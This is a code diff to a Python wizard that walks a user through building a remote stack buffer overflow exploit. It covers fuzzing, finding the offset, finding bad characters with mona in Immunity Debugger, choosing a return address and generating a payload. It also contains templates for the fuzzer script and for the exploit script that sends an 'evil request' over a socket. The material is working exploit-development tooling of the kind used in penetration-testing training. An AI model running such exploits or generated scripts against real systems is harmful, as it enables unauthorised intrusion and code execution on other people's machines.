@@ -620,7 +620,9 @@ def step_offsets():
 		elif bo_type == 'remote':
 			dump_remote_exploit()
 			run_remote_exploit()
-		print(' Does the EIP show 42424242? If not, something is wrong with the offset and you should repeat the previous steps.')
+		print(
+			' Does the EIP show 42424242? If not, something is wrong with the offset and you should repeat the previous steps.')
+		print_info('Write the address down where the Cs start. You can use it later to find bad characters with mona.')
 		# Proceed
 		if proceed_ok():
 			step_badchars()
@@ -636,6 +638,12 @@ def step_badchars():
 	current_step = 3
 	show_step_banner('[3] Finding bad characters')
 	print_info('You must probably repeat this step multiple times until you have found all bad characters.')
+	# Mona info
+	print('''{}
+	In Immunity Debugger, you can use mona to find the bad characters. To do so, do the following before running the exploit:
+	1. Set up working directory:  !mona config -set workingfolder c:\\mona\\%p
+	2. Create byte array:         !mona bytearray
+	{}'''.format(GRAY, FORMAT_END))
 	all_chars_found = False
 	while not all_chars_found:
 		bad_char_buffer.get_buffer()
@@ -645,6 +653,12 @@ def step_badchars():
 			dump_remote_exploit()
 			run_remote_exploit()
 		print('\n Can you see all Cs when following ESP or EAX in dump (depending on where the Cs are stored)?')
+		print('''{}
+		In Immunity Debugger, you can use mona to find the bad characters. 
+		To do so, do the following before resending the exploit:
+		1. Compare:              !mona compare -f c:\\mona\\<app name> -a <address where Cs should start>
+		2. Recreate byte array:  !mona bytearray -cpb "{}<new_bad_char>"
+		{}'''.format(GRAY, '\\x' + '\\x'.join(c for c in badchars), FORMAT_END))
 		show_prompt_text('Enter the character (e.g. 00, 0a, 0d) which does not show up or breaks the exploit')
 		show_prompt_text('To show all possible ascii characters enter {}show ascii{}'.format(BOLD, FORMAT_END))
 		show_prompt_text('Leave empty / press Enter when there a no more bad characters.')
@@ -671,7 +685,7 @@ def step_return():
 	show_step_banner('[4] Finding return address')
 	show_prompt_text('Examine the buffer overflow in the debugger. Which case does apply?')
 	for b in buf_types:
-		show_prompt_text('[ ' + str(b.number) + ' ]' + b.select_text, False)
+		show_prompt_text('[ ' + str(b.number) + ' ] ' + b.select_text, False)
 	# Wait for user selection
 	while True:
 		user_input = int(get_input(number_valid))
@@ -746,14 +760,14 @@ def step_payload():
 				dump_remote_exploit()
 				run_remote_exploit()
 			show_prompt_text('Did your exploit work? If not, try sending a different payload.')
-			show_prompt_text('Enter {}again{} to try again. Hit Enter if everything worked fine.'.format(BOLD,FORMAT_END))
+			show_prompt_text(
+				'Enter {}again{} to try again. Hit Enter if everything worked fine.'.format(BOLD, FORMAT_END))
 			user_input = get_input(check_text)
 			if user_input == '':
 				break
 			else:
 				continue
 	# Finally show prompt till user exits
-	print('showing generic prompt')
 	get_input(generic_check)
 
 
@@ -781,13 +795,14 @@ def create_payload():
 		payload_code = payld
 		# Remove temporary file and folder
 		os.unlink(tmp_file)
-		shutil.rmtree('/__pycache__', ignore_errors=True)
+		shutil.rmtree('__pycache__', ignore_errors=True)
 		# Update buffer with payload
 		buf_types[selected_buffer].get_buffer()
 		print_info('Buffer has been updated with new payload')
 		if len(payload_code) > payload_size:
-			print_warning("The payload was generated as small as possible. However, it is larger than the specified payload size.\n"
-						  "The exploit probably still works fine, but don't be surprised if problems occur.")
+			print_warning(
+				"The payload was generated as small as possible. However, it is larger than the specified payload size.\n"
+				"The exploit probably still works fine, but don't be surprised if problems occur.")
 		return True
 	else:
 		print('\n')
@@ -1351,9 +1366,9 @@ def show_prompt():
 def show_prompt_text(text, show_lines=True):
 	prompt_len = len(show_prompt())
 	if show_lines:
-		print(' '*(prompt_len - 18), '░▒▓', text)
+		print(' ' * (prompt_len - 19), '░▒▓', text)
 	else:
-		print(' ' * (prompt_len - 14), text)
+		print(' ' * (prompt_len - 15), text)
 
 
 def show_step_banner(title):
@@ -1503,7 +1518,6 @@ port = {port}
 # --- Define exploit ------------------------
 buf_length = {buffer}
 offset = {off}
-payload = {pay}
 buffer = {buffer_code}
 # ------------------------------------------
 
@@ -1522,6 +1536,8 @@ with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
 		try:
 			print(' [*] Sending evil request with', len(buffer), 'bytes')
 			s.send(buffer)
+			if s.recv(1024):
+				print('[*] Received response')
 			print('[*] Done')
 	
 		# Stop on timeout
@@ -1534,7 +1550,6 @@ with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
 		   port=port,
 		   buffer=buf_length,
 		   off=offset,
-		   pay=payload_code,
 		   buffer_code=buffer)
 	try:
 		with open(file, 'w') as f:
@@ -1592,27 +1607,31 @@ while len(fuzz_buffer) <= {buff_len}:
 
 for item in fuzz_buffer:
 	with so.socket(so.AF_INET, so.SOCK_STREAM) as s:
-		s.settimeout(10)
-		print(' [*] Connecting to', target)
-		connect = s.connect_ex((target, port))
-	
-		# Stop script if connection cannot be established
-		if connect != 0:
-			print('[!] Connection failed')
-			exit(1)
-	
-		# Connection established: send request
 		try:
-			command = {cmd} + item + {ecmd}
-			print(' [*] Fuzzing with', len(command), 'bytes')
-			s.send(command)
-			s.recv(1024)
-			print('[*] Done')
-	
-		# Stop on timeout
-		except so.timeout:
-			print('[!] Connection failed due to socket timeout.')
-			exit(1)	
+			s.settimeout(10)
+			print(' [*] Connecting to', target)
+			connect = s.connect_ex((target, port))
+		
+			# Stop script if connection cannot be established
+			if connect != 0:
+				print('[!] Connection failed')
+				exit(1)
+		
+			# Connection established: send request
+			try:
+				command = {cmd} + item + {ecmd}
+				print(' [*] Fuzzing with', len(command), 'bytes')
+				s.send(command)
+				s.recv(1024)
+				print('[*] Done')
+		
+			# Stop on timeout
+			except so.timeout:
+				print('[!] Connection failed due to socket timeout.')
+				exit(1)	
+		except (BrokenPipeError, ConnectionResetError):
+			print('[!] The connection was closed while sending the payload')
+			exit(1)
 '''.format(target=target,
 		   port=port,
 		   step=increase_step,
